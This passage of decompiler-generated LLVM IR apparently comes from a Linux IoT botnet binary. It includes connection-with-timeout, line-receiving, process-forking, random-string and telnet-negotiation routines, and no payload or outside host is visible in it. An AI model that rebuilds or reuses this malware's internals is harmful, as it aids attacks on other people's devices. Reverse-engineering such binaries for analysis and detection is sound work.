  br label %dec_label_pc_8049057

dec_label_pc_8049057:                             ; preds = %dec_label_pc_804902e, %dec_label_pc_8049043
  store i32 %v4_8048f9c, i32* @eax, align 4
  %v5_8049061 = inttoptr i32 %arg1 to i8*
  %v5_8049062 = call i32 @strcpy(i8* %v5_8049061, i32 %v4_8048f9c)
  %v2_8049070 = call i32 @__libc_close(i32 %v5_8048f42)
  br label %dec_label_pc_80490da

dec_label_pc_8049084:                             ; preds = %dec_label_pc_8048f52
  %v6_8049098 = call i32 @__GI_memset(i8* %tmp34, i32 0, i32 4096)
  %v5_80490b2 = call i32 @fdgets(i32 %v2_80490a0, i32 4096, i32 %v5_8048f42)
  %v1_80490ba = icmp eq i32 %v5_80490b2, 0
  %v1_80490bc = icmp eq i1 %v1_80490ba, false
  br i1 %v1_80490bc, label %dec_label_pc_8048f52, label %dec_label_pc_80490c2

dec_label_pc_80490c2:                             ; preds = %dec_label_pc_8049084, %entry
  %v2_80490c8 = call i32 @__libc_close(i32 %v5_8048f42)
  br label %dec_label_pc_80490da

dec_label_pc_80490da:                             ; preds = %dec_label_pc_8049057, %dec_label_pc_80490c2
  %storemerge = phi i32 [ 1, %dec_label_pc_80490c2 ], [ 0, %dec_label_pc_8049057 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048f9c, { 3, 4, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_80490a0, { 3, 1, 2, 0 }
  uselistorder i32 %v5_8048f42, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_80490da, { 1, 0 }
  uselistorder label %dec_label_pc_8049057, { 1, 0 }
  uselistorder label %dec_label_pc_8048fde, { 1, 0 }
  uselistorder label %dec_label_pc_8048f9c, { 1, 0 }
  uselistorder label %dec_label_pc_8048f52, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %v5_80490ff = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8052960.24, i32 0, i32 0), i32 0)
  %v2_8049160 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp16 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804917217 = call i32 @fdgets(i32 %v2_8049160, i32 4096, i32 %v5_80490ff)
  %v1_804917a18 = icmp eq i32 %v5_804917217, 0
  %v1_804917c19 = icmp eq i1 %v1_804917a18, false
  br i1 %v1_804917c19, label %dec_label_pc_804910c.lr.ph, label %dec_label_pc_804917e

dec_label_pc_804910c.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804910c

dec_label_pc_804910c:                             ; preds = %dec_label_pc_804910c.lr.ph, %dec_label_pc_804910c
  %stack_var_-12.120 = phi i32 [ 0, %dec_label_pc_804910c.lr.ph ], [ %stack_var_-12.0, %dec_label_pc_804910c ]
  %v3_8049116 = call i32 @uppercase(i8* %tmp16)
  %v5_804912d = call i32 @strstr(i32 %v2_8049160, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805296e.25, i32 0, i32 0))
  %v12_804913d = icmp eq i32 %v5_804912d, %v2_8049160
  %v4_8049141 = zext i1 %v12_804913d to i32
  %stack_var_-12.0 = add i32 %stack_var_-12.120, %v4_8049141
  %v6_8049158 = call i32 @__GI_memset(i8* %tmp16, i32 0, i32 4096)
  %v5_8049172 = call i32 @fdgets(i32 %v2_8049160, i32 4096, i32 %v5_80490ff)
  %v1_804917a = icmp eq i32 %v5_8049172, 0
  %v1_804917c = icmp eq i1 %v1_804917a, false
  br i1 %v1_804917c, label %dec_label_pc_804910c, label %dec_label_pc_804917e

dec_label_pc_804917e:                             ; preds = %dec_label_pc_804910c, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804910c ]
  %v2_8049184 = call i32 @__libc_close(i32 %v5_80490ff)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.0, { 1, 0 }
  uselistorder i32 %v2_8049160, { 3, 1, 2, 0 }
  uselistorder i32 %v5_80490ff, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804910c, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049191 = load i32, i32* @ebp, align 4
  store i32 %v0_8049191, i32* %stack_var_-4, align 4
  %v0_8049195 = load i32, i32* @ebx, align 4
  store i32 %v0_8049195, i32* %stack_var_-12, align 4
  %v5_80491ae = ptrtoint i8* %arg1 to i32
  %v5_80491ef21 = icmp sgt i32 %arg2, 0
  br i1 %v5_80491ef21, label %dec_label_pc_80491a9, label %dec_label_pc_80491f1

dec_label_pc_80491a9:                             ; preds = %entry, %dec_label_pc_80491a9
  %storemerge22 = phi i32 [ %v4_80491e6, %dec_label_pc_80491a9 ], [ 0, %entry ]
  %v6_80491ae = add i32 %storemerge22, %v5_80491ae
  store i32 %v6_80491ae, i32* @ebx, align 4
  %v1_80491b1 = call i32 @rand_cmwc(i32 %storemerge22)
  store i32 %v1_80491b1, i32* @ecx, align 4
  %v2_80491c1 = udiv i32 %v1_80491b1, 26
  %tmp = mul i32 %v2_80491c1, -10
  %v2_80491d9 = add i32 %v1_80491b1, %tmp
  %v1_80491e1 = add i32 %v2_80491d9, 65
  %v11_80491e1 = trunc i32 %v1_80491e1 to i8
  %v2_80491e4 = load i32, i32* @ebx, align 4
  %v3_80491e4 = inttoptr i32 %v2_80491e4 to i8*
  store i8 %v11_80491e1, i8* %v3_80491e4, align 1
  %v4_80491e6 = add nuw nsw i32 %storemerge22, 1
  %exitcond = icmp eq i32 %v4_80491e6, %arg2
  br i1 %exitcond, label %dec_label_pc_80491e9.dec_label_pc_80491f1_crit_edge, label %dec_label_pc_80491a9

dec_label_pc_80491e9.dec_label_pc_80491f1_crit_edge: ; preds = %dec_label_pc_80491a9
  %v2_80491f4.pre = load i32, i32* %stack_var_-12, align 4
  %v2_80491f6.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80491f1

dec_label_pc_80491f1:                             ; preds = %dec_label_pc_80491e9.dec_label_pc_80491f1_crit_edge, %entry
  %v2_80491f6 = phi i32 [ %v2_80491f6.pre, %dec_label_pc_80491e9.dec_label_pc_80491f1_crit_edge ], [ %v0_8049191, %entry ]
  %v2_80491f4 = phi i32 [ %v2_80491f4.pre, %dec_label_pc_80491e9.dec_label_pc_80491f1_crit_edge ], [ %v0_8049195, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_80491e9.dec_label_pc_80491f1_crit_edge ], [ 0, %entry ]
  store i32 %v2_80491f4, i32* @ebx, align 4
  store i32 %v2_80491f6, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_80491e6, { 1, 0 }
  uselistorder i32 %storemerge22, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80491a9, { 1, 0 }
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80491fb = load i32, i32* @edi, align 4
  store i32 %v0_80491fb, i32* %stack_var_-8, align 4
  %v1_8049208 = inttoptr i32 %tmp19 to i8*
  %v1_804920d = and i32 %tmp19, -256
  store i32 %v1_804920d, i32* %eax.global-to-local, align 4
  %v5_804920f = call i8* @_memset(i8* %v1_8049208, i32 %v1_804920d, i32 %tmp20)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804922f = ptrtoint i32* %stack_var_-168 to i32
  %tmp36 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_804922f, i32* @edi, align 4
  %v5_8049236 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v2_8049243 = udiv i32 %tmp15, 32
  %v1_8049249 = urem i32 %tmp15, 32
  store i32 %v1_8049249, i32* %eax.global-to-local, align 4
  %v0_804924c = load i32, i32* @ebp, align 4
  %v2_804924c = mul nuw nsw i32 %v2_8049243, 4
  %v3_804924c = add nsw i32 %v2_804924c, -164
  %v4_804924c = add i32 %v3_804924c, %v0_804924c
  %v5_804924c = inttoptr i32 %v4_804924c to i32*
  %v6_804924c = load i32, i32* %v5_804924c, align 4
  %v9_804924c = shl i32 1, %v1_8049249
  %v12_804924c = or i32 %v6_804924c, %v9_804924c
  store i32 %v12_804924c, i32* %v5_804924c, align 4
  %v1_8049257 = add i32 %tmp15, 1
  %v2_804925b = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_804922f, i32* %eax.global-to-local, align 4
  %v5_8049273 = call i32 @__libc_select(i32 %v1_8049257, i32 %v2_804922f, i32 0, i32 %v2_804922f, i32 %v2_804925b)
  store i32 %v5_8049273, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_8049273, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8049323, label %dec_label_pc_8049319.preheader

dec_label_pc_8049319.preheader:                   ; preds = %entry
  %v7_804931d45 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804931d45, label %dec_label_pc_8049323, label %dec_label_pc_804928d.lr.ph

dec_label_pc_804928d.lr.ph:                       ; preds = %dec_label_pc_8049319.preheader
  br label %dec_label_pc_804928d

dec_label_pc_804928d:                             ; preds = %dec_label_pc_804928d.lr.ph, %dec_label_pc_8049316
  %stack_var_-36.046 = phi i32 [ %tmp11, %dec_label_pc_804928d.lr.ph ], [ %v4_8049316, %dec_label_pc_8049316 ]
  %v0_804928d = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_804928d, i32* %eax.global-to-local, align 4
  %v3_804929b = call i32 @sockprintf(i32 %v0_804928d, i32 ptrtoint ([5 x i8]* @global_var_8052977.27 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804922f, i32* @edi, align 4
  %v5_80492c8 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %v1_8049249, i32* %eax.global-to-local, align 4
  %v0_80492de = load i32, i32* @ebp, align 4
  %v4_80492de = add i32 %v3_804924c, %v0_80492de
  %v5_80492de = inttoptr i32 %v4_80492de to i32*
  %v6_80492de = load i32, i32* %v5_80492de, align 4
  %v12_80492de = or i32 %v6_80492de, %v9_804924c
  store i32 %v12_80492de, i32* %v5_80492de, align 4
  store i32 %v2_804922f, i32* %eax.global-to-local, align 4
  %v5_8049305 = call i32 @__libc_select(i32 %v1_8049257, i32 %v2_804922f, i32 0, i32 %v2_804922f, i32 %v2_804925b)
  store i32 %v5_8049305, i32* %eax.global-to-local, align 4
  %tmp39 = icmp slt i32 %v5_8049305, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_8049323, label %dec_label_pc_8049316

dec_label_pc_8049316:                             ; preds = %dec_label_pc_804928d
  %v4_8049316 = add nsw i32 %stack_var_-36.046, 1
  %v7_804931d = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_804931d, label %dec_label_pc_8049323, label %dec_label_pc_804928d

dec_label_pc_8049323:                             ; preds = %dec_label_pc_8049319.preheader, %dec_label_pc_804928d, %dec_label_pc_8049316, %entry
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v2_804933b = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_804937d

dec_label_pc_8049332:                             ; preds = %dec_label_pc_804937d
  %v0_8049332 = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_8049332, i32* %eax.global-to-local, align 4
  %v5_8049343 = call i32 @__libc_recv(i32 %v0_8049332, i32 %v2_804933b, i32 1, i32 0)
  store i32 %v5_8049343, i32* %eax.global-to-local, align 4
  %v9_804934b = icmp eq i32 %v5_8049343, 1
  br i1 %v9_804934b, label %dec_label_pc_8049362, label %dec_label_pc_8049350

dec_label_pc_8049350:                             ; preds = %dec_label_pc_8049332
  %v4_8049350 = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_8049350, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_804939a

dec_label_pc_8049362:                             ; preds = %dec_label_pc_8049332
  %v3_8049362 = load i8, i8* %stack_var_-177, align 1
  %v4_8049362 = sext i8 %v3_8049362 to i32
  store i32 %v4_8049362, i32* %eax.global-to-local, align 4
  %v4_8049368 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8049362, i8* %stack_var_-32.0, align 1
  %v5_804936d = add i32 %v4_8049368, 1
  %v22_804936d = inttoptr i32 %v5_804936d to i8*
  %v3_8049370 = load i8, i8* %stack_var_-177, align 1
  %v4_8049370 = sext i8 %v3_8049370 to i32
  %v6_8049370 = load i32, i32* %eax.global-to-local, align 4
  %v7_8049370 = and i32 %v6_8049370, -256
  %v8_8049370 = or i32 %v7_8049370, %v4_8049370
  store i32 %v8_8049370, i32* %eax.global-to-local, align 4
  %v10_8049376 = icmp eq i8 %v3_8049370, 10
  br i1 %v10_8049376, label %dec_label_pc_804938b, label %dec_label_pc_804937a

dec_label_pc_804937a:                             ; preds = %dec_label_pc_8049362
  %v4_804937a = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_804937d

dec_label_pc_804937d:                             ; preds = %dec_label_pc_8049323, %dec_label_pc_804937a
  %v7_8049381 = phi i32 [ %tmp19, %dec_label_pc_8049323 ], [ %v8_8049370, %dec_label_pc_804937a ]
  %stack_var_-32.0 = phi i8* [ %v1_8049208, %dec_label_pc_8049323 ], [ %v22_804936d, %dec_label_pc_804937a ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8049323 ], [ %v4_804937a, %dec_label_pc_804937a ]
  %stack_var_12.0 = phi i32 [ %tmp20, %dec_label_pc_8049323 ], [ %v4_804937d, %dec_label_pc_804937a ]
  %v4_804937d = add i32 %stack_var_12.0, -1
  %v9_804937d = sub i32 0, %stack_var_12.0
  %v10_804937d = and i32 %stack_var_12.0, %v9_804937d
  %v11_804937d = icmp slt i32 %v10_804937d, 0
  %v12_804937d = icmp eq i32 %v4_804937d, 0
  %v13_804937d = icmp slt i32 %v4_804937d, 0
  %v3_8049381 = icmp eq i1 %v13_804937d, %v11_804937d
  %v4_8049381 = icmp eq i1 %v12_804937d, false
  %v5_8049381 = and i1 %v4_8049381, %v3_8049381
  %v6_8049381 = zext i1 %v5_8049381 to i32
  %v8_8049381 = and i32 %v7_8049381, -256
  %v9_8049381 = or i32 %v6_8049381, %v8_8049381
  store i32 %v9_8049381, i32* %eax.global-to-local, align 4
  %v4_8049387 = icmp eq i1 %v5_8049381, false
  %v1_8049389 = icmp eq i1 %v4_8049387, false
  br i1 %v1_8049389, label %dec_label_pc_8049332, label %dec_label_pc_804938b

dec_label_pc_804938b:                             ; preds = %dec_label_pc_8049362, %dec_label_pc_804937d
  %stack_var_-32.1 = phi i8* [ %v22_804936d, %dec_label_pc_8049362 ], [ %stack_var_-32.0, %dec_label_pc_804937d ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804939a

dec_label_pc_804939a:                             ; preds = %dec_label_pc_8049350, %dec_label_pc_804938b
  %storemerge = phi i32 [ -1, %dec_label_pc_8049350 ], [ %stack_var_-28.0, %dec_label_pc_804938b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_80493a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80493a0, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804937d, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_804936d, { 1, 0 }
  uselistorder i32 %v1_8049249, { 2, 1, 0 }
  uselistorder i32 %v2_804922f, { 0, 3, 4, 5, 1, 2, 6, 7 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 %tmp19, { 0, 3, 1, 2 }
  uselistorder i32 %tmp15, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 19, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_804939a, { 1, 0 }
  uselistorder label %dec_label_pc_804938b, { 1, 0 }
  uselistorder label %dec_label_pc_804937d, { 1, 0 }
  uselistorder label %dec_label_pc_8049323, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804928d, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_80493a8 = load i32, i32* @edi, align 4
  %v3_80493b9 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80493c4 = or i32 %v3_80493b9, 2048
  %v3_80493d6 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80493c4)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80493e7 = urem i32 %arg3, 65536
  %v1_80493f0 = call i32 @htons(i32 %v1_80493e7)
  store i32 %arg2, i32* @edx, align 4
  %v3_804940a = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049412 = icmp eq i32 %v3_804940a, 0
  br i1 %v1_8049412, label %dec_label_pc_8049425, label %dec_label_pc_8049416

dec_label_pc_8049416:                             ; preds = %entry
  br label %dec_label_pc_8049562

dec_label_pc_8049425:                             ; preds = %entry
  %v2_8049402 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049444 = call i32 @__libc_connect(i32 %arg1, i32 %v2_8049402, i32 16)
  %v5_804944f = icmp slt i32 %v3_8049444, 0
  %v1_8049453 = icmp eq i1 %v5_804944f, false
  br i1 %v1_8049453, label %dec_label_pc_8049529, label %dec_label_pc_8049459

dec_label_pc_8049459:                             ; preds = %dec_label_pc_8049425
  %v1_8049459 = call i32 @__errno_location(i32 %v3_8049444)
  %v1_804945e = inttoptr i32 %v1_8049459 to i32*
  %v2_804945e = load i32, i32* %v1_804945e, align 4
  %v9_8049460 = icmp eq i32 %v2_804945e, 115
  %v1_8049463 = icmp eq i1 %v9_8049460, false
  br i1 %v1_8049463, label %dec_label_pc_804951d, label %dec_label_pc_8049469

dec_label_pc_8049469:                             ; preds = %dec_label_pc_8049459
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049486 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049486, i32* @edi, align 4
  %v5_804948d = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_804949a = udiv i32 %arg1, 32
  %v1_80494a0 = urem i32 %arg1, 32
  %v0_80494a3 = load i32, i32* @ebp, align 4
  %v2_80494a3 = mul nuw nsw i32 %v2_804949a, 4
  %v3_80494a3 = add nsw i32 %v2_80494a3, -164
  %v4_80494a3 = add i32 %v3_80494a3, %v0_80494a3
  %v5_80494a3 = inttoptr i32 %v4_80494a3 to i32*
  %v6_80494a3 = load i32, i32* %v5_80494a3, align 4
  %v9_80494a3 = shl i32 1, %v1_80494a0
  %v12_80494a3 = or i32 %v6_80494a3, %v9_80494a3
  store i32 %v12_80494a3, i32* %v5_80494a3, align 4
  %v1_80494ae = add i32 %arg1, 1
  %v2_80494b2 = ptrtoint i32* %stack_var_-176 to i32
  %v5_80494c5 = call i32 @__libc_select(i32 %v1_80494ae, i32 0, i32 %v2_8049486, i32 0, i32 %v2_80494b2)
  %tmp33 = icmp slt i32 %v5_80494c5, 1
  br i1 %tmp33, label %dec_label_pc_8049511, label %dec_label_pc_80494d1

dec_label_pc_80494d1:                             ; preds = %dec_label_pc_8049469
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80494de = ptrtoint i32* %stack_var_-180 to i32
  %v2_80494e5 = ptrtoint i32* %stack_var_-184 to i32
  %v5_80494f3 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80494e5, i32 %v2_80494de)
  %v3_80494fb = load i32, i32* %stack_var_-184, align 4
  %v1_8049501 = icmp eq i32 %v3_80494fb, 0
  br i1 %v1_8049501, label %dec_label_pc_8049529, label %dec_label_pc_8049505

dec_label_pc_8049505:                             ; preds = %dec_label_pc_80494d1
  br label %dec_label_pc_8049562

dec_label_pc_8049511:                             ; preds = %dec_label_pc_8049469
  br label %dec_label_pc_8049562

dec_label_pc_804951d:                             ; preds = %dec_label_pc_8049459
  br label %dec_label_pc_8049562

dec_label_pc_8049529:                             ; preds = %dec_label_pc_80494d1, %dec_label_pc_8049425
  %v3_8049533 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_804953e = and i32 %v3_8049533, -2049
  %v3_8049550 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_804953e)
  br label %dec_label_pc_8049562

dec_label_pc_8049562:                             ; preds = %dec_label_pc_804951d, %dec_label_pc_8049511, %dec_label_pc_8049505, %dec_label_pc_8049416, %dec_label_pc_8049529
  %v3_8049562 = phi i32 [ 0, %dec_label_pc_804951d ], [ 0, %dec_label_pc_8049511 ], [ 0, %dec_label_pc_8049505 ], [ 0, %dec_label_pc_8049416 ], [ 1, %dec_label_pc_8049529 ]
  store i32 %v0_80493a8, i32* @edi, align 4
  ret i32 %v3_8049562

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049562, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8049570 = load i32, i32* @ebx, align 4
  store i32 %v0_8049570, i32* %stack_var_-8, align 4
  %v1_8049574 = call i32 @__libc_fork(i32 %v0_8049570)
  %v4_804957c = icmp eq i32 %v1_8049574, 0
  %v1_8049580 = icmp eq i1 %v4_804957c, false
  br i1 %v1_8049580, label %dec_label_pc_804958d, label %dec_label_pc_8049582

dec_label_pc_8049582:                             ; preds = %entry
  br label %dec_label_pc_8049671

dec_label_pc_804958d:                             ; preds = %entry
  %v0_804958d = load i32, i32* @global_var_8055428.28, align 8
  %v0_8049592 = load i32, i32* @global_var_805542c.29, align 4
  %v1_8049598 = add i32 %v0_804958d, 1
  %v5_8049598 = icmp eq i32 %v0_804958d, -1
  %v2_804959b = zext i1 %v5_8049598 to i32
  %v3_804959b = add i32 %v2_804959b, %v0_8049592
  store i32 %v1_8049598, i32* @global_var_8055428.28, align 8
  store i32 %v3_804959b, i32* @global_var_805542c.29, align 4
  %v2_80495b8 = mul i32 %v1_8049598, 4
  %v1_80495bb = add i32 %v2_80495b8, 4
  %v1_80495c2 = call i32 @malloc(i32 %v1_80495bb)
  br label %dec_label_pc_80495f8

dec_label_pc_80495d6:                             ; preds = %dec_label_pc_80495f8, %dec_label_pc_8049629
  %v2_80495d9 = mul i32 %storemerge1, 4
  %v5_80495de = add i32 %v2_80495d9, %v1_80495c2
  %v0_80495e9 = load i32, i32* @global_var_805b4a8.30, align 8
  %v2_80495ee = add i32 %v0_80495e9, %v2_80495d9
  %v1_80495f1 = inttoptr i32 %v2_80495ee to i32*
  %v2_80495f1 = load i32, i32* %v1_80495f1, align 4
  %v2_80495f3 = inttoptr i32 %v5_80495de to i32*
  store i32 %v2_80495f1, i32* %v2_80495f3, align 4
  %v4_80495f5 = add i32 %storemerge1, 1
  br label %dec_label_pc_80495f8

dec_label_pc_80495f8:                             ; preds = %dec_label_pc_804958d, %dec_label_pc_80495d6
  %storemerge1 = phi i32 [ %v4_80495f5, %dec_label_pc_80495d6 ], [ 0, %dec_label_pc_804958d ]
  %v0_8049606 = load i32, i32* @global_var_8055428.28, align 8
  %v0_804960b = load i32, i32* @global_var_805542c.29, align 4
  %v4_8049615 = icmp ne i32 %v0_8049606, 0
  %v2_8049618 = zext i1 %v4_8049615 to i32
  %v3_8049618 = add i32 %v0_804960b, -1
  %v4_8049618 = add i32 %v3_8049618, %v2_8049618
  store i32 %v4_8049618, i32* @ebx, align 4
  %v10_8049624 = icmp eq i32 %v4_8049618, 0
  br i1 %v10_8049624, label %dec_label_pc_8049629, label %dec_label_pc_80495d6

dec_label_pc_8049629:                             ; preds = %dec_label_pc_80495f8
  %v1_8049615 = add i32 %v0_8049606, -1
  %v10_8049634 = icmp ult i32 %storemerge1, %v1_8049615
  br i1 %v10_8049634, label %dec_label_pc_80495d6, label %dec_label_pc_8049639

dec_label_pc_8049639:                             ; preds = %dec_label_pc_8049629
  %v2_8049644 = mul i32 %v0_8049606, 4
  %v5_8049647 = add i32 %v1_80495c2, -4
  %v1_804964a = add i32 %v5_8049647, %v2_8049644
  store i32 %v1_804964a, i32* @edx, align 4
  %v2_8049650 = inttoptr i32 %v1_804964a to i32*
  store i32 %v1_8049574, i32* %v2_8049650, align 4
  %v0_8049652 = load i32, i32* @global_var_805b4a8.30, align 8
  %v1_804965b = call i32 @free(i32 %v0_8049652)
  store i32 %v1_80495c2, i32* @global_var_805b4a8.30, align 8
  store i32 %v1_8049574, i32* @ecx, align 4
  br label %dec_label_pc_8049671

dec_label_pc_8049671:                             ; preds = %dec_label_pc_8049582, %dec_label_pc_8049639
  %v3_8049674 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049674, i32* @ebx, align 4
  ret i32 %v1_8049574

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_80495d9, { 1, 0 }
  uselistorder i32 %v1_80495c2, { 2, 0, 1 }
  uselistorder i32 %v0_804958d, { 1, 0 }
  uselistorder label %dec_label_pc_8049671, { 1, 0 }
  uselistorder label %dec_label_pc_80495f8, { 1, 0 }
  uselistorder label %dec_label_pc_80495d6, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049679 = load i32, i32* @ebp, align 4
  store i32 %v0_8049679, i32* %stack_var_-4, align 4
  %v1_8049682 = add i32 %arg2, 1
  %v1_8049683 = inttoptr i32 %v1_8049682 to i8*
  %v2_8049683 = load i8, i8* %v1_8049683, align 1
  %v5_8049683 = and i32 %v1_8049682, -256
  %v9_804968f = icmp ult i8 %v2_8049683, -5
  br i1 %v9_804968f, label %dec_label_pc_804976f, label %dec_label_pc_804969c

dec_label_pc_804969c:                             ; preds = %entry
  %v7_80496a3 = icmp eq i8 %v2_8049683, -1
  br i1 %v7_80496a3, label %dec_label_pc_80496a5, label %dec_label_pc_80496bf

dec_label_pc_80496a5:                             ; preds = %dec_label_pc_804969c
  br label %dec_label_pc_804976f

dec_label_pc_80496bf:                             ; preds = %dec_label_pc_804969c
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_80496ca = ptrtoint i32* %stack_var_-5 to i32
  %v4_80496d1 = call i32 @__libc_send(i32 %arg1, i32 %v2_80496ca, i32 1, i32 16384)
  %v2_80496dd = load i8, i8* %v1_8049683, align 1
  %v11_80496df = icmp eq i8 %v2_80496dd, -4
  %v1_80496e1 = icmp eq i1 %v11_80496df, false
  br i1 %v1_80496e1, label %dec_label_pc_80496e9, label %dec_label_pc_80496e3

dec_label_pc_80496e3:                             ; preds = %dec_label_pc_80496bf
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049739

dec_label_pc_80496e9:                             ; preds = %dec_label_pc_80496bf
  %v2_80496ed = load i8, i8* %v1_8049683, align 1
  %v11_80496ef = icmp eq i8 %v2_80496ed, -2
  %v1_80496f1 = icmp eq i1 %v11_80496ef, false
  br i1 %v1_80496f1, label %dec_label_pc_80496f9, label %dec_label_pc_80496f3

dec_label_pc_80496f3:                             ; preds = %dec_label_pc_80496e9
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049739

dec_label_pc_80496f9:                             ; preds = %dec_label_pc_80496e9
  %v2_80496fd = load i8, i8* %v1_8049683, align 1
  %v10_80496ff = icmp eq i8 %v2_80496fd, 3
  %v1_8049701 = icmp eq i1 %v10_80496ff, false
  %v11_8049725 = icmp eq i8 %v2_80496fd, -3
  %v1_8049727 = icmp eq i1 %v11_8049725, false
  br i1 %v1_8049701, label %dec_label_pc_804971f, label %dec_label_pc_8049703

dec_label_pc_8049703:                             ; preds = %dec_label_pc_80496f9
  %. = select i1 %v1_8049727, i32 253, i32 251
  %v7_8049717 = or i32 %., %v5_8049683
  store i32 %v7_8049717, i32* %stack_var_-5, align 4
